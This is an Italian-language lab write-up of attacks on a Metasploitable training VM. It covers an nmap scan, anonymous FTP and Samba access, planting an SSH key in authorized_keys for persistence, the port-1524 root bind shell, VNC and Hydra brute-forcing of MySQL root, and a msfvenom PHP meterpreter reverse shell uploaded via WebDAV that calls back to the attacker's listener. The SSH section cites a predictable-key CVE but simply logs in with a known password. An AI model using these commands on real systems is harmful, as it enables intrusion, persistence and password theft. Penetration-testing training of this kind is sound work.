# Metasploitable Exploitation Writeup 🎯

Questo documento descrive in dettaglio l'exploitation di varie vulnerabilità su una macchina Metasploitable con indirizzo IP `172.16.49.231`. Gli exploit includono login FTP anonimo, SSH con chiavi deboli, condivisioni Samba anonime, VNC con password debole, brute-forcing della password MySQL, un backdoor bind shell e l'upload di una reverse shell tramite WebDAV. Ogni passo è spiegato chiaramente con comandi in blocchi di codice.

## Reconnaissance Iniziale 🔍

Prima di procedere con gli exploit, è fondamentale identificare porte e servizi aperti sulla macchina target. Questo può essere fatto con uno strumento come Nmap:

```bash
nmap -sV -p- 172.16.49.231

Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-21 16:56 CEST
Nmap scan report for 172.16.49.231
Host is up (0.23s latency).
Not shown: 977 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
1099/tcp open  rmiregistry
1524/tcp open  ingreslock
2049/tcp open  nfs
2121/tcp open  ccproxy-ftp
3306/tcp open  mysql
5432/tcp open  postgresql
5900/tcp open  vnc
6000/tcp open  X11
6667/tcp open  irc
8009/tcp open  ajp13
8180/tcp open  unknown
```

Questo comando scansiona tutte le porte e identifica i servizi in esecuzione, fornendo una base per gli attacchi successivi.

## Exploiting Anonymous FTP Login 🔓

Il servizio FTP consente il login anonimo, offrendo un accesso iniziale al sistema.

1. Connettiti al server FTP usando l'utente `anonymous` e una password vuota:

```bash
ftp 172.16.49.231
```

Inserisci `anonymous` quando richiesto il nome e premi Invio per la password (vuota).

2. Dopo il login, vedrai il prompt FTP:

```
Connected to 172.16.49.231.
220 (vsFTPd 2.3.4)
Name (172.16.49.231:luca): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Questo accesso permette di esplorare il file system e, potenzialmente, caricare o scaricare file.

## Exploiting SSH con Chiavi Deboli 🔑

La macchina è vulnerabile alla "Debian OpenSSL Predictable Random Number Generator Vulnerability" (CVE-2008-0166), che consente di prevedere le chiavi SSH.

1. Connettiti via SSH come utente `msfadmin` usando l'algoritmo `ssh-rsa`:

```bash
ssh -oHostKeyAlgorithms=+ssh-rsa msfadmin@172.16.49.231
```

2. Inserisci la password conosciuta per `msfadmin`. Una volta autenticato, ottieni una shell:

```
msfadmin@172.16.49.231's password:
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
...
msfadmin@metasploitable:~$ whoami
msfadmin
```

## Configurazione di Accesso Persistente via SSH 🛡️

Per semplificare gli accessi futuri, aggiungi la tua chiave pubblica al file `authorized_keys` della macchina target.

1. Genera una coppia di chiavi SSH sulla tua macchina locale:

```bash
ssh-keygen -t ed25519 -C "luca@172.20.253.60"
```

Segui i prompt per salvare la coppia di chiavi:

```
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/luca/.ssh/id_ed25519):
Enter passphrase for "/home/luca/.ssh/id_ed25519" (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/luca/.ssh/id_ed25519
Your public key has been saved in /home/luca/.ssh/id_ed25519.pub
...
```

2. Copia la chiave pubblica sulla macchina target:

```bash
ssh-copy-id -oHostKeyAlgorithms=+ssh-rsa msfadmin@172.16.49.231
```

Inserisci la password quando richiesto:

```
/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: "/home/luca/.ssh/id_ed25519.pub"
...
msfadmin@172.16.49.231's password:
Number of key(s) added: 1
```

3. Ora puoi accedere senza password:

```bash
ssh -oHostKeyAlgorithms=+ssh-rsa msfadmin@172.16.49.231
```

## Exploiting Bind Shell Backdoor 🚪

Un backdoor bind shell è attivo sulla porta 1524, fornendo accesso diretto a una shell root.

1. Connettiti usando Netcat:

```bash
nc 172.16.49.231 1524
```

2. Ottieni una shell root:

```
root@metasploitable:/# whoami
root
```

## Exploiting Samba Anonymous Shares 📂

Il servizio Samba consente l'accesso anonimo alle condivisioni.

1. Elenca le condivisioni disponibili senza autenticazione:

```bash
smbclient -L //172.16.49.231 -N
```

Output:

```
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk
        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
...
```

Queste condivisioni possono essere esplorate o usate per caricare file.

## Exploiting VNC con Password Debole 🖥️

Il server VNC utilizza una password debole o predefinita.

1. Connettiti usando un client VNC:

```bash
xtightvncviewer 172.16.49.231:5900
```

2. Inserisci la password conosciuta per accedere al desktop:

```
Connected to RFB server, using protocol version 3.3
Performing standard VNC authentication
Password:
Authentication successful
Desktop name "root's X desktop (metasploitable:0)"
...
```

## Brute-Forcing della Password MySQL 🔑

Il servizio MySQL ha una password root debole, che può essere scoperta con un attacco brute-force.

1. Usa Hydra per un attacco a dizionario:

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://172.16.49.231
```

2. Hydra troverà la password:

```
[3306][mysql] host: 172.16.49.231   login: root
1 of 1 target successfully completed, 1 valid password found
```

Nota: La password specifica non è mostrata qui, ma verrebbe visualizzata nell'output.

## Exploiting WebDAV per Caricare una Reverse Shell 🌐

La directory WebDAV `/dav` permette l'upload di file, sfruttabile per caricare una reverse shell PHP.

1. Genera un payload con Msfvenom:

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=172.20.253.60 LPORT=4444 -f raw > shell.php
```

2. Carica il payload con Cadaver:

```bash
cadaver http://172.16.49.231/dav/
put shell.php
```

3. Configura un listener in Metasploit:

```bash
msfconsole
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 172.20.253.60
set LPORT 4444
run
```

4. Esegui la reverse shell visitando l'URL:

```
http://172.16.49.231/dav/shell.php
```

5. Il listener riceverà la connessione:

```
[*] Started reverse TCP handler on 172.20.253.60:4444
...
msfadmin@metasploitable:~$ whoami
msfadmin
```
